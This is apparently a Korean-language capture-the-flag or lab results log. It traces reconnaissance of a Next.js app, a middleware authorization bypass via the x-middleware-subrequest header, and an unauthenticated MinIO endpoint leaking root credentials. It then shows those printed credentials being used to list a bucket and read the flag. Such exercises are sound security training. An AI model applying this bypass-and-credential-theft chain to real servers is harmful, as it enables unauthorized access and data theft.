# All Results — lab-security-wave

## 결과 1 (EVID-RECON-001)

```
HTTP/2 200
server: nginx
content-type: application/json
content-security-policy: default-src 'self'; ...

{"service":"control-portal","status":"online"}
```

판정: 대상은 `nginx` 뒤에 있는 `control-portal`이라는 이름의 서비스. HTML 프론트는 아님.

## 결과 2 (EVID-RECON-002)

```
HTTP/2 404 (둘 다 동일)
Next.js 커스텀 404 페이지, buildId: 5oS3tYmhtJlBfJ0jOLFlb, nextExport:true
```

판정: 이 앱은 Next.js **정적 export**로 빌드됨. `/login` 경로는 존재하지 않음.

## 결과 3 (EVID-RECON-003)

```
sortedPages: ["/_app", "/_error"]
```

판정: 정적으로 빌드된 실제 페이지가 `/_app`, `/_error`뿐 — 화면 UI가 사실상 없고 로직은
클라이언트 JS 번들 안에 있을 가능성.

## 결과 4 (EVID-RECON-004)

```
GET 후보 11개 전부 404 (Next.js 커스텀 404 페이지, 동일 etag)
OPTIONS / -> 405 Not Allowed (nginx 기본 에러 페이지, Allow 헤더 없음)
POST / -> 405 Not Allowed (동일)
```

판정: 무작위 경로 추측은 신호가 없음. nginx가 `/`에서 GET 외 메서드를 거부 — 애플리케이션
레벨이 아니라 nginx 레벨 제한으로 판단.

## 결과 5 (EVID-RECON-005)

```
main.js 안에서 발견:
  /api/admin/storage
  정규식: /api\/admin\/storage(\.json)?[\/#\?]?$/
```

판정: 클라이언트 번들에 하드코딩된 라우트 매처 발견 — 실제 보호 대상 경로는
`/api/admin/storage`. 이전까지 추측한 `/admin`, `/control` 등은 전부 틀린 경로였음.

## 결과 6 (EVID-EXPLOIT-001) — 핵심 발견 1

```
[인증 헤더 없이]
HTTP/2 401
{"error":"administrator session required"}

[x-middleware-subrequest 헤더 추가]
HTTP/2 200
x-lab-app-retest: /retest/app/api/admin/storage
x-lab-minio-method: POST
x-lab-minio-path: /minio/bootstrap/v1/verify
x-lab-minio-retest: /retest/minio/bootstrap/v1/verify
x-lab-s3-bucket: lab-final
x-lab-s3-endpoint: https://lab.security-wave.kro.kr
x-lab-ticket: b5e7ff6be25b59b678c308c519683cd3ab45b9616873f6365679e7c38bc6b918

{"status":"storage review authorized","instruction":"Use the response headers to continue the assessment."}
```

판정: **인증 우회 성공(FACT)**. Next.js 미들웨어 인가 우회(CVE-2025-29927 계열,
`x-middleware-subrequest` 헤더로 미들웨어 실행 자체를 건너뜀) 재현됨. 우회 응답에 다음
단계로 필요한 모든 정보(MinIO 검증 엔드포인트, 티켓, 대상 버킷명)가 그대로 노출됨.

## 결과 7 (EVID-EXPLOIT-002) — 핵심 발견 2

```
HTTP/2 200
x-amz-request-id: 18CB8A2D2D96FDDF

{
  "MinioEndpoints": [...],
  "MinioEnv": {
    "MINIO_ROOT_USER": "lab0ed030c5d2039adf",
    "MINIO_ROOT_PASSWORD": "8fa0d0ebef4f4a0344010e7b168fb797188dbe8f686003f9beef31207fc5dd27",
    "MINIO_ACCESS_KEY_FILE": "access_key",
    "MINIO_SECRET_KEY_FILE": "secret_key",
    ...
  }
}
```

판정: **Credential 노출 확인(FACT)**. MinIO `/minio/bootstrap/v1/verify`가 인증 없이
루트 Access/Secret Key를 포함한 서버 환경변수 전체를 반환(CVE-2023-28432 계열, MinIO
정보노출). 마스킹 버전은 `evidence/masked/minio-verify.json` 참고, 원본은
`evidence/raw/minio-verify.json` 참고.

## 결과 8 (EVID-EXPLOIT-003)

```
HTTP/1.1 200
<ListBucketResult>
  lab-final/README.txt (78B)
  lab-final/archive/decoy.json (68B)
  lab-final/evidence/final.json (108B)
```

판정: 노출된 root credential로 SigV4 서명 요청이 그대로 인증됨 — 버킷 목록 조회 가능
확인(FACT).

## 결과 9 (EVID-EXPLOIT-004) — 최종

```
README.txt:
  "Control Storage Review\n\nThe evidence object is not stored at the bucket root.\n"

archive/decoy.json:
  {"status": "archived", "flag": "FLAG{not_the_final_evidence}"}

evidence/final.json:
  {"flag": "FLAG{aa5b51c2cc3f56a7ac44cedf04eceef4}", "scope": "isolated-lab", "proof": "s3-read-only"}
```

판정: **최종 Flag 확인(FACT)**: `FLAG{aa5b51c2cc3f56a7ac44cedf04eceef4}`.
`archive/decoy.json`의 flag는 README 힌트("not stored at the bucket root")와 파일명
("decoy")으로 볼 때 미끼로 판단.
